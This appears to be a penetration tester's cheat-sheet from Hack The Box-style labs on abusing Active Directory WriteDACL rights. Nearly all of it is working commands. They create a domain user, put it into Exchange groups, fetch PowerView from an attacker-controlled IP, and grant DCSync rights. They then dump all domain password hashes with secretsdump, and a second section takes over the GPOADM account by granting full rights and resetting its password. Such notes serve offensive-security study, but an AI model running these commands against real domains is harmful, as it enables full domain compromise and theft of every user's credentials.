
An severe misconfiguration which grants us the power to grant ourselves any permission on the domain.

---
## Group WriteDACL

1. Creating user and putting him into the Group we want to elevate our privileges.

```
net user hacker password /add /domain  
net group “Exchange Windows Permissions” hacker /add
```

2. Adding user to the "Exchange Trusted Subsystem" Group. 

```
PS C:\\Users\\svc-alfresco\\appdata> Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members svc-alfresco
```

3. Re-login into user for the group membership to take effect. 

4. Load PowerView and set up [[DCSync]] rights.

```
iwr -iri http://10.10.4.23/PowerView.ps1 -OutFile PowerView.ps1
Import-Module .\PowerView.ps1
```

5. Setting up DCSync rights.

```
Add-DomainObjectAcl -TargetIdentity “DC=htb,DC=local” -PrincipalIdentity hacker -Rights DCSync
```

Since our created user "hacker" got DSync permissions now, we can dump all the hashes of users of the domain remotely.

```
impacket-secretsdump htb.local/hacker:password@10.129.59.98
```

---
## User WriteDACL

##### Remotely

-

##### Internally

Inspected our current user's amelia.griffiths outbound object control was promising. She is inside the "legacy" group, which has WriteDACL on the gpoadm. 

Since we don't have the password of amelia.griffiths, we have to abuse the WriteDACL internally, which we can do with PowerView.ps1.

1. Let's first transfer PowerView.ps1 onto the target and inject it into memory.

```
iwr -uri http://10.10.14.57/PowerView.ps1 -OutFile PowerView.ps1
. .\PowerView.ps1
```

2. Now I’ll give Amelia.Griffiths permissions over the GPOADM account, and then set the password:

```
Add-DomainObjectAcl -Rights all -TargetIdentity GPOADM -PrincipalIdentity Amelia.Griffiths
$cred = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword GPOADM -AccountPassword $cred
```

3. Verifying if password change worked:

```
nxc smb dc.baby2.vl -u GPOADM -p 'Password123!'
```

It worked! We successfully changed the password of the GPOADM user.